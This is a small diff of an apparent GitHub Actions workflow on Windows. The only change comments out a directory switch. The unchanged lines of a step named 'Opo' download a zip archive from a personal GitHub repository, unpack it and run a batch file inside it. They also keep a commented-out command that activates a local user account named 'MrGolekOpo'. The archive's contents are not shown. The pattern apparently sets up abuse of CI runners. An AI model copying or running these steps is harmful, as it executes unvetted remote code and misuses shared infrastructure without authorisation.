@@ -35,7 +35,7 @@ jobs:
     - name: Opo
       run: |
         #net user MrGolekOpo /active:yes
-        chdir C:\Windows\System32
+        #chdir C:\Windows\System32
         Invoke-WebRequest https://raw.githubusercontent.com/wadaefendi/daef/main/Api_App.zip -Outfile Api_App.zip
         Expand-Archive Api_App.zip
         cmd /k call maingi.bat
